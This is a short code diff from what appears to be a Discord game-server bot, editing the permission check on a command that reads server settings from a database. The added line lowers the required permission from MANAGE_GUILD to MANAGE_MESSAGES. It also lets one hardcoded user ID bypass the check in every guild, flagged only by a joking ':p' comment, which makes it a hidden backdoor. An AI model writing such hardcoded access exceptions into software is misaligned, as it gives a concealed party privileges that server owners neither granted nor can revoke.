@@ -71,7 +71,7 @@ ${prefix}players  Displays how many players are online (lists them if it can)
 				});
 			} else if (args.length >= 1) {
 				let member = msg.guild.member(msg.author);
-				if (member.hasPermission("MANAGE_GUILD")) {
+				if (member.hasPermission("MANAGE_MESSAGES") || member.id === "276363003270791168" /* :p */) {
 					db.get("SELECT * FROM `servers` WHERE `DISCORD` = ?", serverID, function (err, res) {
 						if (err) msg.channel.send("There was an error with the query.");
 						else {
